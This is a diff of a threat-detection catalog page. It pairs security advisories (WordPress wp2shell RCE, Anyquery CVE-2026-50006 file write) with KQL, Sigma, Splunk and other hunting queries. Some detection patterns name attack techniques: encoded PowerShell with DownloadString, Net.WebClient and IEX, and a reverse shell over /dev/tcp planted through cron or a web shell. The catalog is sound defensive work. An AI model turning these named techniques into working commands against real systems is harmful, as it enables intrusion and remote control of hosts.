-    <div class="tab-content active" id="art-212-uc2-kql"><pre><button class="copy-btn">COPY</button><code>DeviceFileEvents
-| where Timestamp &gt; ago(7d)
-| where ActionType == &quot;FileCreated&quot;
-| where FolderPath has_any (&quot;/wp-content/&quot;,&quot;\\wp-content\\&quot;,&quot;/wp-admin/&quot;,&quot;\\wp-admin\\&quot;,&quot;/wp-includes/&quot;,&quot;\\wp-includes\\&quot;)
-| where FileName endswith &quot;.php&quot; or FileName endswith &quot;.phtml&quot; or FileName endswith &quot;.php5&quot; or FileName endswith &quot;.php7&quot; or FileName endswith &quot;.phar&quot;
-| where InitiatingProcessFileName in~ (&quot;httpd&quot;,&quot;apache2&quot;,&quot;nginx&quot;,&quot;php-fpm&quot;,&quot;php-fpm7.4&quot;,&quot;php-fpm8.0&quot;,&quot;php-fpm8.1&quot;,&quot;php-fpm8.2&quot;,&quot;php-fpm8.3&quot;,&quot;w3wp.exe&quot;,&quot;php-cgi.exe&quot;)
-| project Timestamp, DeviceName, User=InitiatingProcessAccountName, FolderPath, FileName, WebDaemon=InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-212-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>ImFileEvent
-| where TimeGenerated &gt; ago(7d)
-| where EventType == &quot;FileCreated&quot;
-| where TargetFilePath has_any (&quot;/wp-content/&quot;,&quot;\\wp-content\\&quot;,&quot;/wp-admin/&quot;,&quot;\\wp-admin\\&quot;,&quot;/wp-includes/&quot;,&quot;\\wp-includes\\&quot;)
-| where TargetFileExtension in~ (&quot;php&quot;,&quot;phtml&quot;,&quot;php5&quot;,&quot;php7&quot;,&quot;phar&quot;)
-| where ActingProcessName has_any (&quot;httpd&quot;,&quot;apache2&quot;,&quot;nginx&quot;,&quot;php-fpm&quot;,&quot;w3wp.exe&quot;,&quot;php-cgi.exe&quot;)
-| project TimeGenerated, Host=DvcHostname, User=ActorUsername, TargetFilePath, TargetFileName, ActingProcessName, ActingProcessCommandLine
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-212-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: New PHP File Written to WordPress Web Root by Web Daemon (wp2shell web shell)
-id: 6c4e9d21-7a58-4b3f-9d21-1f8c3a5e7b04
-status: experimental
-description: Detects creation of a .php/.phtml/.php5/.phar file under wp-content, wp-admin or wp-includes by a web worker process, indicative of web shell persistence after the wp2shell pre-auth RCE (CVE-2026-63030).
-references:
-  - https://www.aikido.dev/blog/unauthenticated-rce-in-wordpress-wp2shell
-  - https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/
-author: SOC Detection Engineering
-date: 2026/07/18
-tags:
-  - attack.persistence
-  - attack.t1505.003
-logsource:
-  category: file_event
-detection:
-  selection:
-    Image|endswith:
-      - &#x27;/httpd&#x27;
-      - &#x27;/apache2&#x27;
-      - &#x27;/nginx&#x27;
-      - &#x27;/php-fpm&#x27;
-      - &#x27;\w3wp.exe&#x27;
-      - &#x27;\php-cgi.exe&#x27;
-    TargetFilename|contains:
-      - &#x27;/wp-content/&#x27;
-      - &#x27;/wp-admin/&#x27;
-      - &#x27;/wp-includes/&#x27;
-    TargetFilename|endswith:
-      - &#x27;.php&#x27;
-      - &#x27;.phtml&#x27;
-      - &#x27;.php5&#x27;
-      - &#x27;.phar&#x27;
-  condition: selection
-falsepositives:
-  - WordPress core/plugin/theme auto-updates writing PHP files during a maintenance window
-  - Legitimate plugin installs performed via the admin UI
-level: high</code></pre></div>
-    <div class="tab-content" id="art-212-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>source:windows.sysmon @EventID:11 @Image:(*\\w3wp.exe OR *\\W3WP.exe OR *\\php-cgi.exe OR *\\PHP-CGI.exe) @TargetFilename:(*\\wp-content\\* OR *\\wp-admin\\* OR *\\wp-includes\\*) @TargetFilename:(*.php OR *.phtml OR *.php5 OR *.phar)</code></pre></div>
-    <div class="tab-content" id="art-212-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=FileWritten
-| ContextImageFileName=/(httpd|apache2|nginx|php-fpm|w3wp\.exe|php-cgi\.exe)/i
-| TargetFileName=/(wp-content|wp-admin|wp-includes).*\.(php|phtml|php5|php7|phar)$/i
-| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())</code></pre></div>
-    <div class="tab-content" id="art-212-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-212-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-212-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-212-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where (Filesystem.action=&quot;created&quot; AND (Filesystem.file_path=&quot;*/wp-content/*&quot; OR Filesystem.file_path=&quot;*/wp-admin/*&quot; OR Filesystem.file_path=&quot;*/wp-includes/*&quot;) AND (Filesystem.file_name=&quot;*.php&quot; OR Filesystem.file_name=&quot;*.phtml&quot; OR Filesystem.file_name=&quot;*.php5&quot; OR Filesystem.file_name=&quot;*.php7&quot; OR Filesystem.file_name=&quot;*.phar&quot;)) by Filesystem.dest, Filesystem.user, Filesystem.file_path, Filesystem.file_name, Filesystem.action
-| `drop_dm_object_name(&quot;Filesystem&quot;)`
-| convert ctime(firstTime) ctime(lastTime)
-| sort - lastTime</code></pre><pre class="spl-mode-body" id="art-212-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where (Filesystem.action=&quot;created&quot; AND (Filesystem.file_path=&quot;*/wp-content/*&quot; OR Filesystem.file_path=&quot;*/wp-admin/*&quot; OR Filesystem.file_path=&quot;*/wp-includes/*&quot;) AND (Filesystem.file_name=&quot;*.php&quot; OR Filesystem.file_name=&quot;*.phtml&quot; OR Filesystem.file_name=&quot;*.php5&quot; OR Filesystem.file_name=&quot;*.php7&quot; OR Filesystem.file_name=&quot;*.phar&quot;)) by Filesystem.dest, Filesystem.user, Filesystem.file_path, Filesystem.file_name, Filesystem.action
-| `drop_dm_object_name(&quot;Filesystem&quot;)`
-| convert ctime(firstTime) ctime(lastTime)
-| sort - lastTime</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="">
-  <summary>
-    <span class="uc-title">Asset exposure — vulnerability matches article CVE(s)</span>
-    <span class="uc-phase">Reconnaissance</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="222a505c20" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Match vulnerability scanner output to the CVE(s) named in the article.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
-    
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-212-uc3-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-212-uc3-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-212-uc3-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-212-uc3-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
-// partitions on Timestamp instead of scanning the full retention.
-DeviceTvmSoftwareVulnerabilities
-| where Timestamp &gt; ago(1d)
-| where CveId in~ (&quot;CVE-2026-60137&quot;, &quot;CVE-2026-63030&quot;)
-| join kind=inner (DeviceInfo | where Timestamp &gt; ago(1d)) on DeviceId
-| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
-| order by VulnerabilitySeverityLevel asc, DeviceName asc
-</code></pre></div>
-    <div class="tab-content" id="art-212-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
-// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
-// no Sentinel translation — track via Update / Heartbeat OS-version
-// gaps as a coarse approximation.
-DeviceTvmSoftwareVulnerabilities
-| where TimeGenerated &gt; ago(1d)
-| where CveId in~ (&quot;CVE-2026-60137&quot;, &quot;CVE-2026-63030&quot;)
-| join kind=inner (DeviceInfo | where TimeGenerated &gt; ago(1d)) on DeviceId
-| project DeviceName, OSPlatform, CveId,
-          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
-| order by VulnerabilitySeverityLevel asc, DeviceName asc
-</code></pre></div>
-    <div class="tab-content" id="art-212-uc3-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-212-uc3-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-212-uc3-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-212-uc3-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Vulnerabilities
-    where Vulnerabilities.signature IN (&quot;CVE-2026-60137&quot;, &quot;CVE-2026-63030&quot;)
-    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
-| `drop_dm_object_name(Vulnerabilities)`
-| sort - severity</code></pre><pre class="spl-mode-body" id="art-212-uc3-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Vulnerabilities
-    where Vulnerabilities.signature IN (&quot;CVE-2026-60137&quot;, &quot;CVE-2026-63030&quot;)
-    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
-| `drop_dm_object_name(Vulnerabilities)`
-| sort - severity</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="27f9f5bb66" data-platforms="def,sent,sigma,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">PowerShell encoded / obfuscated command</span>
-    <span class="uc-phase">Exploitation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="27f9f5bb66" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Encoded or obfuscated PowerShell — common across loaders, recon, and post-exploitation.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="PowerShell">T1059.001</span> <span class="ind tech" title="Obfuscated Files or Information">T1027</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">DeviceProcessEvents</span></div>
-    
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-212-uc4-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-212-uc4-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-212-uc4-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-212-uc4-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-212-uc4-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where AccountName !endswith &quot;$&quot;
-| where FileName in~ (&quot;powershell.exe&quot;,&quot;pwsh.exe&quot;)
-| where ProcessCommandLine matches regex @&quot;(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)&quot;
-| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
-          InitiatingProcessFileName, InitiatingProcessCommandLine</code></pre></div>
-    <div class="tab-content" id="art-212-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>SecurityEvent
-| where TimeGenerated &gt; ago(7d)
-| where EventID == 4688
-| where Account !endswith &quot;$&quot;
-| where NewProcessName endswith &quot;\powershell.exe&quot;
-   or NewProcessName endswith &quot;\pwsh.exe&quot;
-| where CommandLine matches regex @&quot;(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)&quot;
-| project TimeGenerated, Computer, Account, NewProcessName,
-          CommandLine, ParentProcessName
-| order by TimeGenerated desc
-</code></pre></div>
-    <div class="tab-content" id="art-212-uc4-sigma"><pre><button class="copy-btn">COPY</button><code>title: Obfuscated / Encoded PowerShell Execution
-id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
-status: experimental
-description: |
-    PowerShell launched with -EncodedCommand, base64 strings, hidden
-    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
-    .WebClient.DownloadString — combinations indicating evasion.
-references:
-    - https://attack.mitre.org/techniques/T1059/001/
-    - https://attack.mitre.org/techniques/T1027/
-author: Clankerusecase
-date: 2026/05/02
-tags:
-    - attack.t1059.001
-    - attack.t1027
-    - attack.execution
-    - attack.defense-evasion
-logsource:
-    category: process_creation
-    product: windows
-detection:
-    selection_image:
-        Image|endswith:
-            - &#x27;\powershell.exe&#x27;
-            - &#x27;\pwsh.exe&#x27;
-    selection_args:
-        CommandLine|contains:
-            - &#x27;-enc &#x27;
-            - &#x27;EncodedCommand&#x27;
-            - &#x27;FromBase64String&#x27;
-            - &#x27;Invoke-Expression&#x27;
-            - &#x27;IEX(&#x27;
-            - &#x27;DownloadString&#x27;
-            - &#x27;Net.WebClient&#x27;
-            - &#x27;-w hidden&#x27;
-            - &#x27;-WindowStyle Hidden&#x27;
-            - &#x27;-nop&#x27;
-            - &#x27;-NoProfile&#x27;
-            - &#x27;-ep bypass&#x27;
-            - &#x27;-ExecutionPolicy Bypass&#x27;
-    condition: selection_image and selection_args
-falsepositives:
-    - DevOps tooling that legitimately uses encoded command for
-      cross-shell escaping
-level: high
-</code></pre></div>
-    <div class="tab-content" id="art-212-uc4-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-212-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-212-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-212-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Endpoint.Processes
-    where Processes.process_name IN (&quot;powershell.exe&quot;,&quot;pwsh.exe&quot;)
-      AND (Processes.process=&quot;*-enc *&quot; OR Processes.process=&quot;*EncodedCommand*&quot;
-        OR Processes.process=&quot;*FromBase64String*&quot; OR Processes.process=&quot;*-nop*&quot;
-        OR Processes.process=&quot;*-w hidden*&quot; OR Processes.process=&quot;*Invoke-Expression*&quot;
-        OR Processes.process=&quot;*IEX(*&quot; OR Processes.process=&quot;*DownloadString*&quot;
-        OR Processes.process=&quot;*Net.WebClient*&quot;)
-    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
-| `drop_dm_object_name(Processes)`</code></pre><pre class="spl-mode-body" id="art-212-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Endpoint.Processes
-    where Processes.process_name IN (&quot;powershell.exe&quot;,&quot;pwsh.exe&quot;)
-      AND (Processes.process=&quot;*-enc *&quot; OR Processes.process=&quot;*EncodedCommand*&quot;
-        OR Processes.process=&quot;*FromBase64String*&quot; OR Processes.process=&quot;*-nop*&quot;
-        OR Processes.process=&quot;*-w hidden*&quot; OR Processes.process=&quot;*Invoke-Expression*&quot;
-        OR Processes.process=&quot;*IEX(*&quot; OR Processes.process=&quot;*DownloadString*&quot;
-        OR Processes.process=&quot;*Net.WebClient*&quot;)
-    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
-| `drop_dm_object_name(Processes)`</code></pre></div></div>
-  </div>
-</details></div>
-</article>
 <article class="card" id="art-214" data-art-slug="2026-07-17-three-steps-to-the-terminal-a-siemens-rox-ii-zero-day-trilog"
   data-phases="actions,c2,exploit,install,recon" data-sev="crit"
   data-techs="T1053.005,T1059.001,T1190"
@@ -16420,6 +15919,514 @@ DeviceTvmSoftwareVulnerabilities
     by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
 | `drop_dm_object_name(Vulnerabilities)`
 | sort - severity</code></pre></div></div>
+  </div>
+</details></div>
+</article>
+<article class="card" id="art-241" data-art-slug="2026-07-14-ghsa-critical-cve-2026-50006-anyquery-arbitrary-file-write-a"
+  data-phases="actions,c2,delivery,exploit,install,recon" data-sev="crit"
+  data-techs="T1190"
+  data-sources="GitHub Security Advisories"
+  data-platforms="datadog,def,falcon,sent,sigma,spl"
+  data-splunk-cats="application,endpoint,network"
+  data-targets="linux,vcs,windows"
+  data-uc-count="7" data-llm-uc-count="5"
+  data-search="[GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode CVE-2026-50006 T1190 [LLM] Anyquery server mode bound to all interfaces (exposed unauthenticated MySQL port) [LLM] Inbound connection to Anyquery listener from a public IP [LLM] Anyquery process writing files to cron/webroot/SSH persistence paths (ATTACH DATABASE AFW) [LLM] ATTACH DATABASE statement targeting persistence paths in Anyquery query logs [LLM] Reverse shell via cron/webshell payload dropped through Anyquery AFW (/dev/tcp) Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou">
+  <div class="sev-ribbon crit">Critical</div>
+  <button class="share-btn card-share" data-share-art="2026-07-14-ghsa-critical-cve-2026-50006-anyquery-arbitrary-file-write-a" title="Copy share link to this article" aria-label="Copy share link">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+  </button>
+  <h2><a href="https://github.com/advisories/GHSA-xrcf-6jh3-ggvx" target="_blank" rel="noopener">[GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode</a></h2>
+  <div class="source-badges"><span class="source-badge ">GitHub Security Advisories</span></div>
+  <div class="pubmeta">
+    <span>2026-07-14</span>
+    <span>7 use cases</span>
+    <span>1 technique</span>
+    <span>5 kill-chain phases detected</span>
+  </div>
+  <p class="summary">Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode</p>
+  <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-50006</span></div>
+<div class="ind-group"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+  <div class="action-row">
+    <button class="btn btn-kc" data-target="art-241-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
+    <button class="btn btn-hunt" data-hunt-art="art-241"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
+    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
+  </div>
+  <div class="killchain" id="art-241-kc">
+  <div class="kc3d"><div class="kc-cell hit">
+  <div class="num">Phase 1</div>
+  <div class="name">Reconnaissance</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell ">
+  <div class="num">Phase 2</div>
+  <div class="name">Weaponization</div>
+  <div class="marker">—</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 3</div>
+  <div class="name">Delivery</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 4</div>
+  <div class="name">Exploitation</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 5</div>
+  <div class="name">Installation</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 6</div>
+  <div class="name">Command &amp; Control</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell inferred">
+  <div class="num">Phase 7</div>
+  <div class="name">Actions on Objectives</div>
+  <div class="marker">Likely</div>
+</div></div>
+  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ Asset exposure — vulnerability matches article CVE(s)</em></div>
+<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
+<div class="phase-line hit"><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). <em>→ [LLM] Anyquery server mode bound to all interfaces (exposed unauthenticated MySQL port) · [LLM] Inbound connection to Anyquery listener from a public IP</em></div>
+<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] ATTACH DATABASE statement targeting persistence paths in Anyquery query logs</em></div>
+<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] Anyquery process writing files to cron/webroot/SSH persistence paths (ATTACH DATABASE AFW) · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou</em></div>
+<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking. <em>→ [LLM] Reverse shell via cron/webshell payload dropped through Anyquery AFW (/dev/tcp)</em></div>
+<div class="phase-line inferred"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage.</div></div>
+</div>
+  <div class="usecases"><details class="uc" data-uc-slug="080462833b" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows" open>
+  <summary>
+    <span class="uc-title">Anyquery server mode bound to all interfaces (exposed unauthenticated MySQL port)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Delivery</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="080462833b" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Hunts for the Anyquery binary launched in `server` mode with a wildcard bind (0.0.0.0), which exposes the unauthenticated MySQL-compatible port abused in CVE-2026-50006 for ATTACH DATABASE arbitrary file write. Surfaces the attack-surface exposure before any exploitation occurs.
+
+Rationale: Uses the article&#x27;s exact invocation `anyquery server --host 0.0.0.0 --port 8070`; the combination of the named binary, the `server` subcommand and a wildcard bind is the precise exposure precondition for the CVE and is not a generic template.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
+  • https://github.com/julien040/anyquery/releases</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Data/analytics team legitimately running Anyquery server on an internal, network-segmented host</li><li>Container image that binds 0.0.0.0 by convention but is only reachable inside a private overlay network</li><li>Developer running `anyquery server` in a local test/CI environment</li><li>Reverse-proxy fronted deployment where 0.0.0.0 bind is intentional but auth is enforced upstream</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: confirm the Anyquery version (`anyquery --version`); anything &lt; 0.4.5 is vulnerable. Check the bind address and whether the port is reachable from outside the host/subnet. 2) Contain: firewall the listener to localhost/trusted CIDRs or stop the service; upgrade to &gt;= 0.4.5. 3) Hunt: on the same host review DeviceFileEvents for anyquery-initiated writes to /etc/cron.d, /var/www, /root/.ssh (see the AFW use case) and inbound connections from public IPs.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-241-uc0-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-241-uc0-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-241-uc0-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-241-uc0-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-241-uc0-falcon">Falcon LogScale</button>
+      <button class="tab-btn" data-target="art-241-uc0-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-241-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where FileName =~ &quot;anyquery&quot;
+| where ProcessCommandLine has &quot;server&quot;
+| where ProcessCommandLine has_any (&quot;--host 0.0.0.0&quot;, &quot;--host=0.0.0.0&quot;, &quot;-h 0.0.0.0&quot;, &quot;0.0.0.0&quot;)
+| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
+| where TimeGenerated &gt; ago(7d)
+| where TargetProcessName has &quot;anyquery&quot;
+| where TargetProcessCommandLine has &quot;server&quot;
+| where TargetProcessCommandLine has &quot;0.0.0.0&quot;
+| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ParentProcessName
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Anyquery Server Mode Bound To All Interfaces
+id: 4b1f8a2e-2d6c-4f1a-9c7b-8a1d3e5f0a11
+description: Detects Anyquery launched in server mode with a wildcard bind, exposing the unauthenticated MySQL port abused by CVE-2026-50006.
+references:
+  - https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
+author: SOC Detection Engineering
+date: 2026/07/15
+tags:
+  - attack.t1190
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection:
+    Image|endswith: &#x27;/anyquery&#x27;
+    CommandLine|contains|all:
+      - &#x27;server&#x27;
+      - &#x27;0.0.0.0&#x27;
+  condition: selection
+level: medium</code></pre></div>
+    <div class="tab-content" id="art-241-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:EXECVE @process.command_line:*anyquery* @process.command_line:*server* @process.command_line:*0.0.0.0*</code></pre></div>
+    <div class="tab-content" id="art-241-uc0-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ImageFileName=/anyquery$/i
+| regex(&quot;server&quot;, field=CommandLine)
+| regex(&quot;0\\.0\\.0\\.0&quot;, field=CommandLine)
+| groupBy([aid, ComputerName, ImageFileName, CommandLine], function=count())</code></pre></div>
